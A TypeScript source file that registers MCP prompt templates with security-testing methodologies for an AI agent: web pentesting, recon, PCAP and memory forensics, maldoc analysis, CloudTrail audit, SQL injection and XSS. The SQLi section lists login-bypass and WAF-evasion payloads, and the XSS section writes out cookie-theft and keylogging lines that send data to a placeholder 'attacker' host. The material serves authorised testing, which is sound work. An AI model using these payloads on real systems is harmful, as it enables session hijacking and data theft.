/**
 * MCP Prompts — methodology guides for security testing workflows.
 *
 * Each prompt provides a structured, step-by-step methodology that an AI agent
 * can follow to perform a complete security assessment workflow.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";

export function register(server: McpServer): void {
  server.prompt(
    "web_app_pentest",
    "Full web application penetration testing methodology — covers recon through exploitation.",
    { target: z.string().describe("Target URL or domain") },
    ({ target }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# Web Application Penetration Test Methodology

**Target:** ${target}

## Phase 1: Reconnaissance
1. Run \`recon_quick("${target}")\` to check robots.txt, security.txt, headers, and common directories.
2. Run \`recon_dns("${target}")\` for full DNS enumeration (A, AAAA, MX, TXT, NS, AXFR, BIND version).
3. Run \`recon_tls_sans("${target}")\` to extract hidden subdomains from TLS certificates.
4. Run \`recon_directory_bruteforce("${target}")\` to discover hidden paths.
5. Run \`recon_vhost("${target}", "${target}")\` to discover virtual hosts.

## Phase 2: Authentication Testing
6. Run \`auth_csrf_extract\` on login/registration forms.
7. Run \`auth_bruteforce\` with common credentials (use realistic names like james.wilson, sarah.chen).
8. Run \`auth_cookie_tamper\` to test for cookie-based privilege escalation.

## Phase 3: Injection Testing
9. For each input parameter found:
   - Run \`sqli_where_bypass\` and \`sqli_blind_time\` to test for SQL injection.
   - Run \`nosqli_detect\` to test for NoSQL injection.
   - Run \`xss_reflected_test\` to test for XSS.
   - Run \`cmdi_test\` to test for command injection.
   - Run \`path_traversal_test\` to test for directory traversal.

## Phase 4: SSRF Testing
10. For URL/redirect parameters:
    - Run \`ssrf_test\` with localhost bypass variants.
    - Run \`ssrf_cloud_metadata\` for AWS/GCP/Azure metadata access.

## Phase 5: Access Control & Business Logic
11. Run \`idor_test\` on any endpoints with ID parameters.
12. Run \`role_escalation_test\` to test cookie/parameter-based role manipulation.
13. Run \`price_manipulation_test\` on checkout/purchase endpoints.
14. Run \`coupon_abuse_test\` if coupon/discount features exist.

## Phase 6: Client-Side & Header Testing
15. Run \`clickjacking_test\` on sensitive action pages (account settings, admin).
16. Run \`cors_test\` on API endpoints to check CORS misconfigurations.
17. Run \`file_upload_test\` on any file upload endpoints.
18. Run \`deserialization_test\` to check for serialized objects in cookies.

## Phase 7: API-Specific Testing
19. If GraphQL endpoint found:
    - Run \`graphql_introspect\` to enumerate the schema.
    - Run \`graphql_find_hidden\` to discover sensitive hidden fields.
20. Run \`nosqli_auth_bypass\` on login endpoints with JSON bodies.

## Phase 8: Verification
21. Verify every finding with a second request.
22. Test auth-required endpoints to confirm bypasses actually work.
23. Document both vulnerabilities AND confirmed protections.

## Reporting
- Classify each finding: Critical / High / Medium / Low / Informational.
- Include proof-of-concept evidence.
- Provide remediation recommendations.`,
          },
        },
      ],
    })
  );

  server.prompt(
    "pcap_forensics",
    "Step-by-step PCAP analysis workflow for network forensics investigations.",
    { pcap_path: z.string().describe("Path to the PCAP file") },
    ({ pcap_path }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# PCAP Forensics Analysis Workflow

**PCAP File:** ${pcap_path}

## Step 1: Overview
Run \`pcap_overview("${pcap_path}")\` to get:
- Protocol hierarchy (what protocols are present)
- Endpoint statistics (who is talking to whom)
- Total packet count and capture duration

## Step 2: DNS Analysis
Run \`pcap_dns_analysis("${pcap_path}")\` to:
- List all DNS queries (reveals what the host was looking up)
- Identify DNS servers used
- Check for DNS tunneling indicators (unusual query lengths, high frequency)

## Step 3: Credential Extraction
Run \`pcap_extract_credentials("${pcap_path}", "all")\` to extract:
- FTP credentials (USER/PASS commands)
- HTTP Authorization headers (Basic/Bearer tokens)
- SMTP credentials (base64-encoded)
- HTTP POST data (login forms)

## Step 4: Port Scan Detection
Run \`pcap_detect_scan("${pcap_path}")\` to:
- Identify scanning IPs (high SYN packet count)
- Determine targeted ports/services

## Step 5: TLS Analysis
Run \`pcap_tls_analysis("${pcap_path}")\` to:
- Extract SNI values (reveals visited domains)
- Identify TLS versions in use
- Capture client randoms for potential decryption

## Step 6: HTTP Object Export
Run \`pcap_http_objects("${pcap_path}", "/tmp/pcap_export/")\` to:
- Export all downloaded files
- Look for malware, scripts, or sensitive documents

## Step 7: Stream Analysis
For suspicious connections identified above:
- Run \`pcap_follow_stream("${pcap_path}", STREAM_NUM)\` to read full conversations
- Look for reverse shells, data exfiltration, lateral movement

## Step 8: LLMNR/NTLM
Run \`pcap_llmnr_ntlm("${pcap_path}")\` to detect:
- LLMNR poisoning attacks
- NTLM credential capture

## Reconstruction
Piece together the attack timeline:
1. Initial access (scan → exploit)
2. Credential theft
3. Lateral movement
4. Data exfiltration
5. Persistence`,
          },
        },
      ],
    })
  );

  server.prompt(
    "memory_forensics",
    "Memory dump analysis workflow using Volatility for incident response.",
    {
      dump_path: z.string().describe("Path to the memory dump file"),
      os_type: z.enum(["linux", "windows"]).default("linux").describe("Operating system type"),
    },
    ({ dump_path, os_type }) => {
      const text =
        os_type === "linux"
          ? `# Linux Memory Forensics Workflow

**Dump:** ${dump_path}

## Step 1: Identify OS
Run \`volatility_linux("${dump_path}", "PROFILE", "linux_banner")\` to confirm OS version.
(Determine the correct profile first — check the profile list or use strings on the dump.)

## Step 2: Process Analysis
- \`linux_pslist\` — List all processes. Look for suspicious names.
- \`linux_pstree\` — View parent-child relationships. Unusual children of init/systemd are suspicious.
- \`linux_bash\` — Extract bash history. May reveal attacker commands.

## Step 3: Network Connections
- \`linux_netstat\` — Active connections. Look for:
  - Connections to unusual external IPs
  - Listening backdoor ports
  - Reverse shell connections (established connection to attacker IP on high port)

## Step 4: Rootkit Detection
Run \`memory_detect_rootkit("${dump_path}", "PROFILE")\` to check:
- Syscall table hooks
- Hidden kernel modules

## Step 5: File Enumeration
- \`linux_enumerate_files\` — Full filesystem listing.
- Look for recently modified files in /tmp, /dev/shm, /var/tmp.
- Look for suspicious cron entries.

## Investigation Tips
- Base64-encoded strings in bash history often contain CTF flags or encoded payloads.
- ncat/nc processes with established connections indicate reverse shells.
- Kernel module names that don't match standard modules indicate rootkits.`
          : `# Windows Memory Forensics Workflow

**Dump:** ${dump_path}

## Step 1: System Info
Run \`volatility_windows("${dump_path}", "windows.info")\` to identify the OS version.

## Step 2: Process Analysis
- \`windows.pslist\` — List all processes.
- \`windows.pstree\` — View hierarchy. Look for:
  - cmd.exe/powershell.exe spawned by unusual parents
  - rundll32.exe as child of unknown process (DLL injection)
  - svchost.exe not child of services.exe

## Step 3: Malware Detection
- \`windows.malfind\` — Detect injected code:
  - PAGE_EXECUTE_READWRITE memory = code injection indicator
  - MZ headers in non-image regions = process hollowing

## Step 4: Network Activity
- \`windows.netscan\` / \`windows.netstat\` — Active and recent connections.
- Correlate suspicious processes with network connections.

## Step 5: Filesystem
- \`windows.filescan\` — Full file listing.
- \`windows.cmdline\` — Command-line arguments per process.
- \`windows.dlllist\` — DLLs loaded per process.

## Step 6: Persistence
- \`windows.svcscan\` — Registered services.
- \`windows.registry.hivelist\` — Registry hives for autorun entries.

## Key Indicators
- PAGE_EXECUTE_READWRITE + MZ header = classic process injection
- rundll32 as child of unknown = DLL injection technique
- VPN client processes may obscure C2 traffic from NIDS`;

      return {
        messages: [
          {
            role: "user" as const,
            content: { type: "text" as const, text },
          },
        ],
      };
    }
  );

  server.prompt(
    "recon_methodology",
    "Comprehensive reconnaissance checklist for target enumeration.",
    { target: z.string().describe("Target domain or IP") },
    ({ target }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# Reconnaissance Methodology

**Target:** ${target}

## Passive Recon
1. \`recon_dns("${target}")\` — Full DNS enumeration.
2. \`recon_tls_sans("${target}")\` — Hidden subdomains in TLS certs.
3. Check robots.txt, security.txt via \`recon_quick("${target}")\`.

## Active Recon
4. \`recon_directory_bruteforce("${target}")\` — Discover hidden paths.
5. \`recon_vhost("${target}", "${target}")\` — Virtual host discovery.
6. \`recon_git_secrets(REPO_PATH)\` — If a git repo is accessible.
7. \`recon_s3_bucket("assets.${target}")\` — Test S3 bucket access.

## Key Checks
- 404 error pages: May leak server version, framework, or debug info.
- Custom response headers: Look for non-standard headers with sensitive data.
- Directory listing: /images/, /uploads/, /backup/ may have listing enabled.
- Default virtual host: Connect to raw IP without Host header.
- JavaScript bundles: Search for hardcoded API keys, endpoints, credentials.

## OSINT
- GitHub: Search for the target organization's repos.
- Shodan: Check exposed services.
- Certificate Transparency logs: Find all issued certificates.`,
          },
        },
      ],
    })
  );

  server.prompt(
    "malware_analysis",
    "Malware document analysis workflow for suspected Emotet/macro droppers.",
    { file_path: z.string().describe("Path to the suspicious file") },
    ({ file_path }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# Malware Document Analysis Workflow

**File:** ${file_path}

## Step 1: Initial Triage
Run \`maldoc_analyze("${file_path}")\` for the full pipeline:
- OLE stream listing (streams marked 'M' contain macros)
- VBA macro extraction
- Auto-execution trigger identification
- Suspicious API detection
- IOC extraction (URLs, IPs)

## Step 2: Detailed Macro Analysis
Run \`maldoc_extract_macros("${file_path}")\` for raw VBA code.

## Step 3: Manual Deobfuscation Checklist
1. Find the auto-execution entry point (Document_open, AutoOpen).
2. Trace the execution flow through function calls.
3. Look for string concatenation obfuscation.
4. Check user form storage for hidden data (common in Emotet).
5. Identify padding patterns (repeated characters used as obfuscation).
6. Base64 decode any encoded strings.

## Step 4: Payload Analysis
After deobfuscation, look for:
- PowerShell downloaders (DownloadString, DownloadFile)
- WMI process creation (win32_Process.Create)
- certutil -decode for file drops
- Multiple fallback download URLs

## Step 5: IOC Collection
- Download URLs
- C2 server IPs
- File hashes
- Registry keys modified
- Scheduled tasks created

## Common Patterns
- VBA macro -> deobfuscate base64 from form -> PowerShell -> WMI -> download payload
- Living-off-the-land: Uses built-in Windows tools to avoid detection.`,
          },
        },
      ],
    })
  );

  server.prompt(
    "cloud_security_audit",
    "Cloud security investigation workflow for AWS CloudTrail analysis.",
    { log_dir: z.string().describe("Path to CloudTrail log directory") },
    ({ log_dir }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# Cloud Security Audit Workflow

**CloudTrail Logs:** ${log_dir}

## Step 1: Log Overview
Run \`cloudtrail_analyze("${log_dir}")\` to get:
- Event timeline
- Unique users
- Event type frequency
- Source IPs
- Error events

## Step 2: Anomaly Detection
Run \`cloudtrail_find_anomalies("${log_dir}")\` to identify:
- Non-AWS source IPs (potential external attackers)
- Role assumption chains (lateral movement)
- Sensitive API calls (CreateUser, CreateAccessKey, DeleteTrail)
- Data access events (GetObject, ListBuckets)

## Step 3: Investigation
For each anomalous IP:
1. Check which user account it's associated with.
2. Trace all API calls from that IP.
3. Check for role assumption (AssumeRole events).
4. Look for privilege escalation (CreateUser, AttachUserPolicy).
5. Look for persistence (CreateAccessKey, CreateLoginProfile).

## Step 4: Data Exfiltration Check
- S3 GetObject events from unusual IPs.
- Large numbers of ListObjects/GetObject in short timeframes.
- Bucket policy changes (PutBucketPolicy, PutBucketAcl).

## Step 5: Timeline Reconstruction
Build a chronological attack narrative:
1. Initial access (compromised credentials)
2. Enumeration (ListBuckets, DescribeInstances)
3. Privilege escalation (AssumeRole, AttachUserPolicy)
4. Data exfiltration (GetObject)
5. Persistence (CreateAccessKey)
6. Anti-forensics (DeleteTrail, StopLogging)`,
          },
        },
      ],
    })
  );

  server.prompt(
    "sqli_methodology",
    "Complete SQL injection testing methodology — from detection through extraction.",
    {
      target_url: z.string().describe("Target URL to test"),
      parameter: z.string().describe("Parameter name to test for SQLi"),
    },
    ({ target_url, parameter }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# SQL Injection Testing Methodology

**Target:** ${target_url}
**Parameter:** ${parameter}

## Step 1: Detection
1. \`sqli_where_bypass("${target_url}", "${parameter}", "LEGIT_VALUE")\` — Test OR 1=1 variants.
2. \`sqli_blind_time("${target_url}", "${parameter}", "mysql")\` — Time-based detection (try all DB types).
3. \`sqli_blind_boolean("${target_url}", "${parameter}")\` — Boolean-based detection.

## Step 2: Characterization
Based on detection results:
- **Error-based**: If SQL errors are visible, extract data via error messages.
- **UNION-based**: If output is rendered, use \`sqli_union_extract\`.
- **Blind boolean**: If true/false can be distinguished by response size.
- **Blind time**: If only time delays indicate true/false.

## Step 3: Data Extraction
For UNION-based:
1. \`sqli_union_extract("${target_url}", "${parameter}")\` — Auto-discover columns and extract DB metadata.
2. Use discovered column positions to extract specific tables and data.
3. \`sqli_file_read\` if MySQL with FILE privilege.

For Blind:
1. \`sqli_blind_boolean("${target_url}", "${parameter}", "database()")\` — Extract DB name char-by-char.
2. Extract table names: \`(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())\`
3. Extract column names and data similarly.

## Step 4: WAF Bypass (if filtered)
Try these evasion techniques:
- Inline comments: \`SEL/**/ECT\`
- Case variation: \`sElEcT\`
- Hex encoding: \`0x61646d696e\` for 'admin'
- MySQL versioned comments: \`/*!50000UNION*/\`
- Double URL encoding: \`%2527\`

## Step 5: Login Bypass
If a login form is the target:
1. \`sqli_login_bypass("${target_url}")\` — Test comment truncation.
2. Try: \`admin'-- -\`, \`' OR 1=1-- -\`, \`' OR '1'='1\``,
          },
        },
      ],
    })
  );

  server.prompt(
    "xss_methodology",
    "Complete XSS testing methodology — detection, context identification, payload crafting.",
    {
      target_url: z.string().describe("Target URL to test"),
      parameter: z.string().describe("Parameter name to test for XSS"),
    },
    ({ target_url, parameter }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# XSS Testing Methodology

**Target:** ${target_url}
**Parameter:** ${parameter}

## Step 1: Reflection Detection
1. \`xss_reflected_test("${target_url}", "${parameter}")\` — Test 10 payload variants.
2. Check which payloads reflect unescaped vs encoded.

## Step 2: Context Identification
Determine where your input lands:
- **HTML body**: \`<p>YOUR_INPUT</p>\` — Use script tags or event handlers.
- **HTML attribute**: \`<input value="YOUR_INPUT">\` — Break out with quotes.
- **JavaScript**: \`var x = "YOUR_INPUT"\` — Break out of string context.
- **URL**: \`<a href="YOUR_INPUT">\` — javascript: scheme.

## Step 3: Payload Generation
\`xss_payload_generate(CONTEXT, FILTER_BYPASS)\` — Get tailored payloads.

Contexts: html_body, html_attribute, javascript, url, css
Bypass levels: none, tag_filter, keyword_filter, waf, aggressive

## Step 4: Filter Evasion
If basic payloads are blocked:
1. Try \`tag_filter\` bypass (event handlers instead of script tags).
2. Try \`keyword_filter\` bypass (template literals, fromCharCode).
3. Try \`waf\` bypass (polyglots, encoding chains).

## Step 5: Impact Demonstration
For confirmed XSS:
- Cookie theft: \`document.location='http://attacker/steal?c='+document.cookie\`
- Session hijacking: Steal auth tokens from localStorage
- Keylogging: \`document.onkeypress=function(e){new Image().src='http://attacker/log?k='+e.key}\`

## DOM-Based XSS
Check JavaScript sources and sinks:
- Sources: \`document.location\`, \`window.name\`, \`document.referrer\`, \`location.hash\`
- Sinks: \`eval()\`, \`innerHTML\`, \`document.write()\`, \`outerHTML\`, \`setTimeout()\``,
          },
        },
      ],
    })
  );
}
